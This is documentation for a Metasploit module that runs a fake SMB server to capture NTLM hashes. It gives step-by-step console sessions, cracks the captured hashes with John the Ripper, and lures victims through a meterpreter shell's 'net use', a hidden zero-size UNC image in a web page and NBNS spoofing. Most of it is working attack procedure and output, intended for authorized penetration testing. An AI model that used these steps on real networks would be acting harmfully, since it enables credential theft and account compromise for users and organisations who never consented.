This module creates a mock SMB server which accepts credentials before returning `NT_STATUS_LOGON_FAILURE`. Supports SMBv1 & SMBv2, and captures NTLMv1 & NTLMv2 hashes.



## Verification Steps
Microsoft provides an article on how to detect, disable, and enable SMB in various versions
[here](https://support.microsoft.com/en-us/help/2696547/detect-enable-disable-smbv1-smbv2-smbv3-in-windows-and-windows-server), which can be useful during testing.

1. Start msfconsole
2. Connect DB
3. Do: ```use auxiliary/server/capture/smb```
4. Do: ```run```
5. Connect to above server with your SMB client of choice
6. Observe the capturing of hash
7. `creds`
8. check hash has been stored in DB correctly

## Options

**CAINPWFILE**

A file to store Cain & Abel formatted captured hashes in. Only supports NTLMv1 Hashes.

**CHALLENGE**

The 8 byte server challenge. If unset or not a valid 16 character hexadecimal pattern, a random challenge is used instead.

**JOHNPWFILE**

A file to store John the Ripper formatted hashes in.

**DOMAIN**

The domain name used during smb exchange.

## Scenarios

### Linux Connection via smbclient

Kali 2021.1 with `smbclient 4.13.5` installed.

Server:

```
msf6 exploit(multi/handler) > use auxiliary/server/capture/smb
msf6 auxiliary(server/capture/smb) > set JOHNPWFILE /tmp/john
JOHNPWFILE => /tmp/john
msf6 auxiliary(server/capture/smb) > run
[*] Auxiliary module running as background job 1.

[+] Server is running. Listening on 0.0.0.0:445

[+] Received SMB connection on Auth Capture Server!
[SMB] NTLMv2-SSP Client   : 192.168.1.48
[SMB] NTLMv2-SSP Username : WORKGROUP\kali
[SMB] NTLMv2-SSP Hash     : kali::WORKGROUP:736a878aaa12787d:63b3d264cfcdff09b45f6bc05e5f8e47:01010000000000008060dc6c958fd70141b248fffd1ac50b000000000200120061006e006f006e0079006d006f00750073000100120061006e006f006e0079006d006f00750073000400120061006e006f006e0079006d006f00750073000300120061006e006f006e0079006d006f0075007300070008008060dc6c958fd70106000400020000000800300030000000000000000000000000000000d68027f68e3bbafdb72e0ff445687858643dbad597210f1273fa58505bc4be360a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0031002e0031003900360000000000
```

Client:

```
root@Kali:~# smbclient //192.168.89.1/fake
Enter WORKGROUP\root's password: 
session setup failed: NT_STATUS_LOGON_FAILURE
```

Crack the Hash:

```
# cat /tmp/john
kali::WORKGROUP:736a878aaa12787d:63b3d264cfcdff09b45f6bc05e5f8e47:01010000000000008060dc6c958fd70141b248fffd1ac50b000000000200120061006e006f006e0079006d006f00750073000100120061006e006f006e0079006d006f00750073000400120061006e006f006e0079006d006f00750073000300120061006e006f006e0079006d006f0075007300070008008060dc6c958fd70106000400020000000800300030000000000000000000000000000000d68027f68e3bbafdb72e0ff445687858643dbad597210f1273fa58505bc4be360a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0031002e0031003900360000000000
# john /tmp/john_netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
test             (ubuntu)
1g 0:00:00:00 DONE (2019-09-25 22:46) 11.11g/s 1865Kp/s 1865Kc/s 1865KC/s 24782478..playpen
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed

```

### Windows XP via net use

Method also confirmed on Windows 2008r2

Based off of [hackers-arise.com](https://web.archive.org/web/20210503073722/https://www.hackers-arise.com/post/2018/11/19/metasploit-basics-part-20-creating-a-fake-smb-server-to-capture-credentials)

The idea here is we have a shell on a Windows box where we can't `hashdump` due to user permissions.
However, we're able to do a `net use` to make an `SMB` connection back to our server to get the
user's hash, then hopefully crack it.

```
meterpreter > hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use auxiliary/server/capture/smb
msf6 auxiliary(server/capture/smb) > set JOPHNPWFILE /tmp/john
JOHNPWFILE => /tmp/john
msf6 auxiliary(server/capture/smb) > run
[*] Auxiliary module running as background job 1.

[+] Server is running. Listening on 0.0.0.0:445

msf6 auxiliary(server/capture/smb) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > shell
Process 892 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\Documents and Settings\test\Desktop>net use \\192.168.89.1 fake

[+] Received SMB connection on Auth Capture Server!
[SMB] NTLMv1-SSP Client   : 192.168.89.135
[SMB] NTLMv1-SSP Username : ADAM-9256FBF58E\Administrator
[SMB] NTLMv1-SSP Hash     : Administrator::ADAM-9256FBF58E:a24be400055ae1ef1a33f3ab7be1728952c359127a11df42:83468ec2e17ac10e1eccd724764111402c218c36f39ae0f4:1ab4f830af5ee914

Logon failure: unknown user name or bad password.


C:\Documents and Settings\test\Desktop>
```

We're now able to use John the Ripper to crack the password.

```
# cat /tmp/john_netntlm 
test::WINXP:7f1a8bbdf965d969339b08f160d292692f85252cc731bb25:e02333eb6ac047b8d4d4f5759b1a455161d4bc576f75460c:1122334455667788
# john /tmp/john_netntlm --format=netlm  --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Using default target encoding: CP850
Loaded 1 password hash (netlm, LM C/R [DES 32/64])
Warning: poor OpenMP scalability for this hash type, consider --fork=8
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
FAKE             (test)
1g 0:00:00:00 DONE (2019-09-25 22:28) 1.333g/s 1398Kp/s 1398Kc/s 1398KC/s 123456..LATISHA1
Use the "--show --format=netlm" options to display all of the cracked passwords reliably
Session completed
```

### UNC in Websites Vector

One way to coax a user into creating an SMB connection is to embed it in a website

First, create the website (we're using Kali for this) with the following content:

```html 
<html>
  <head>
    <title>UNC Example</title>
  </head>
  <body>
    <img src="file:////192.168.89.1/fake.jpg" width="0px" height="0px">
  </body>
</html>
```

This file, for the example is in `/var/www/html/unc.html`.

Also of note, this could be done via XSS or other injection technique.

Start the webserver:

```service apache2 start```

Server:

```
msf6 > use auxiliary/server/capture/smb
msf6 auxiliary(server/capture/smb) > set JOHNPWFILE /tmp/john
JOHNPWFILE => /tmp/john
msf6 auxiliary(server/capture/smb) > run
[*] Auxiliary module running as background job 1.

[+] Server is running. Listening on 0.0.0.0:445

[+] Received SMB connection on Auth Capture Server!
[SMB] NTLMv1-SSP Client   : 192.168.89.135
[SMB] NTLMv1-SSP Username : ADAM-9256FBF58E\Administrator
[SMB] NTLMv1-SSP Hash     : Administrator::ADAM-9256FBF58E:22f18e6b511c5249bfea193a6a456426bb0b6ddeea0ea7c2:2bc17238894d18eb455fdd9e8ec360c1ea3b33321d178a5f:b4c64af3688809f4
```

Client:

```
Browse to the webpage.  This example is on Windows Server 2008r2 with Internet Explorer.
```

Crack the password:

```
# john /tmp/john_netntlmv2 -wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 17 password hashes with 17 different salts (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Remaining 15 password hashes with 15 different salts
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password123      (Administrator)
Password123      (Administrator)
Password123      (Administrator)
Password123      (Administrator)
Password123      (Administrator)
Password123      (Administrator)
Password123      (Administrator)
Password123      (Administrator)
Password123      (Administrator)
Password123      (Administrator)
Password123      (Administrator)
Password123      (Administrator)
Password123      (Administrator)
Password123      (Administrator)
Password123      (Administrator)
15g 0:00:00:00 DONE (2019-09-26 14:06) 115.3g/s 283569p/s 4253Kc/s 4253KC/s dyesebel..holaz
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

### Spoofing NBNS

If the target(s) are on the local network, it's possible to conduct an `nbns` spoof to attract
additional SMB queries to your host.  This scenario will utilize `auxiliary/spoof/nbns/nbns_response`
to conduct the spoofing.  If a Windows user attempts to browse or mount a network name such as
`\\fake`, the `nbns` module will respond back with the set IP.

This is based on [hackingarticles.in](https://www.hackingarticles.in/4-ways-capture-ntlm-hashes-network/)

Server side:

```
msf6 > use auxiliary/server/capture/smb
msf6 auxiliary(server/capture/smb) > set JOHNPWFILE /tmp/johnnbns
JOHNPWFILE => /tmp/johnnbns
msf6 auxiliary(server/capture/smb) > run
[*] Auxiliary module running as background job 0.

[+] Server is running. Listening on 0.0.0.0:445
msf6 auxiliary(server/capture/smb) > use auxiliary/spoof/nbns/nbns_response
msf6 auxiliary(spoof/nbns/nbns_response) > set spoofip 192.168.89.1
spoofip => 192.168.89.1
msf6 auxiliary(spoof/nbns/nbns_response) > set interface eth0
interface => eth0
msf6 auxiliary(spoof/nbns/nbns_response) > exploit
[*] Auxiliary module running as background job 1.
msf6 auxiliary(spoof/nbns/nbns_response) > 
[*] NBNS Spoofer started. Listening for NBNS requests with REGEX ".*" ...
[+] 192.168.89.135    nbns - FAKE matches regex, responding with 192.168.89.1
[+] 192.168.89.135    nbns - FAKE matches regex, responding with 192.168.89.1
[+] Received SMB connection on Auth Capture Server!
[SMB] NTLMv1-SSP Client   : 192.168.89.135
[SMB] NTLMv1-SSP Username : ADAM-9256FBF58E\Administrator
[SMB] NTLMv1-SSP Hash     : Administrator::ADAM-9256FBF58E:603fd7b40a566fdb974dc56ef6da91bebd500cef4b7758dd:eb64ff6a5bfa268ef178d32835dbb07385fbb340ae3794fa:431f659ef973decc
```

Victim:

```
Open Explorer and type \\fake
```

Finally, Crack the password:

```
# john /tmp/johnnbns_netntlmv2 -wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 6 password hashes with 6 different salts (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password123      (Administrator)
Password123      (Administrator)
Password123      (Administrator)
Password123      (Administrator)
Password123      (Administrator)
Password123      (Administrator)
6g 0:00:00:00 DONE (2019-09-26 16:25) 100.0g/s 614400p/s 3686Kc/s 3686KC/s dyesebel..holaz
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

### Word Document UNC Injector

Another strategy is to create content which can entice a user to open, containing a UNC link, and
thus creating an SMB connection.  To accomplish this, we use `auxiliary/docx/word_unc_injector`.

